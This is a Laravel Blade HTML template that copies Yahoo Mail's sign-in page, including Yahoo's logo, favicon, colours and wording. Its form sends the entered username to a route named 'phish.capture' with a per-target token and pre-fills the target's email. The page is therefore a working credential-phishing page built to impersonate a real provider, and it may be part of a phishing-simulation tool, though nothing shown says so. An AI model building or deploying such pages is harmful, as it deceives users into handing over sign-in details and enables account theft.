<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login - Sign in to Yahoo Mail</title>
    <link rel="icon" href="https://s.yimg.com/cv/apiv2/default/icons/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Yahoo Product Sans VF','Helvetica Neue',Helvetica,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column}
        .topbar{height:4px;background:linear-gradient(90deg,#7b1fa2 0%,#e91e63 33%,#ff9800 66%,#ff5722 100%)}
        header{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;background:#fff}
        .logo img{height:28px;width:auto}
        .header-right{display:flex;gap:24px;align-items:center}
        .header-right a{font-size:14px;color:#6001d2;text-decoration:none;font-weight:500}
        .header-right a:hover{text-decoration:underline}
        .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
        .card{width:360px;padding:40px;background:#fff;border-radius:16px;box-shadow:0 2px 4px rgba(0,0,0,.08)}
        .card h1{font-family:'Centra No2','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:24px;font-weight:700;color:#141414;margin-bottom:32px}
        .input-group{margin-bottom:24px;position:relative}
        .input-group input{width:100%;height:44px;padding:12px 16px;font-size:14px;font-weight:450;font-family:'Yahoo Product Sans VF','Helvetica Neue',sans-serif;color:#141414;background:transparent;border:none;border-bottom:2px solid #e0e0e0;outline:none;transition:border-color .15s}
        .input-group input:focus{border-bottom-color:#6001d2}
        .input-group input::placeholder{color:#999;font-weight:400}
        .checkbox-row{display:flex;align-items:center;gap:10px;margin-bottom:24px}
        .checkbox-row input[type="checkbox"]{width:18px;height:18px;accent-color:#6001d2;cursor:pointer}
        .checkbox-row label{font-size:14px;color:#141414;cursor:pointer}
        .btn-next{width:100%;height:52px;background:#7d2eff;color:#fff;border:none;border-radius:9999px;font-size:16px;font-weight:600;font-family:'Yahoo Product Sans VF','Helvetica Neue',sans-serif;cursor:pointer;transition:background .15s}
        .btn-next:hover{background:#6a1fe6}
        .google-signin{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;height:48px;margin-top:16px;background:#fff;color:#333;border:1px solid #ddd;border-radius:9999px;font-size:14px;font-weight:500;cursor:pointer;transition:background .15s}
        .google-signin:hover{background:#f5f5f5}
        .google-signin svg{width:20px;height:20px}
        .forgot-link{display:block;text-align:center;margin-top:20px;font-size:14px;color:#6001d2;text-decoration:none;font-weight:500}
        .forgot-link:hover{text-decoration:underline}
        .create-account{text-align:center;margin-top:24px;font-size:14px;color:#6001d2;text-decoration:none;font-weight:500}
        .create-account:hover{text-decoration:underline}
        footer{padding:16px 24px;text-align:center;font-size:12px;color:#999;border-top:1px solid #f0f0f0}
        footer a{color:#999;text-decoration:none;margin:0 8px}
        footer a:hover{text-decoration:underline;color:#333}
        @media(max-width:480px){.card{width:100%;padding:24px}}
    </style>
</head>
<body>
    <div class="topbar"></div>
    <header>
        <div class="logo">
            <img src="https://s.yimg.com/rz/p/yahoo_mail_en-US_s_f_p_101x28_2x.png" alt="Yahoo">
        </div>
        <div class="header-right">
            <a href="#">Help</a>
            <a href="#">Sign in</a>
        </div>
    </header>

    <div class="main">
        <div class="card">
            <h1>Sign in to Yahoo Mail</h1>

            <form action="{{ route('phish.capture', ['provider' => 'yahoo', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="input-group">
                    <input type="text" name="username" placeholder="Username, email or phone number" value="{{ $email }}" autofocus>
                </div>

                <div class="checkbox-row">
                    <input type="checkbox" id="staySignedIn" checked>
                    <label for="staySignedIn">Stay signed in</label>
                </div>

                <button type="submit" class="btn-next">Next</button>
            </form>

            <button class="google-signin">
                <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                Sign in with Google
            </button>

            <a href="#" class="forgot-link">Forgot username?</a>
            <a href="#" class="create-account">Create an account</a>
        </div>
    </div>

    <footer>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Help</a>
    </footer>
</body>
</html>
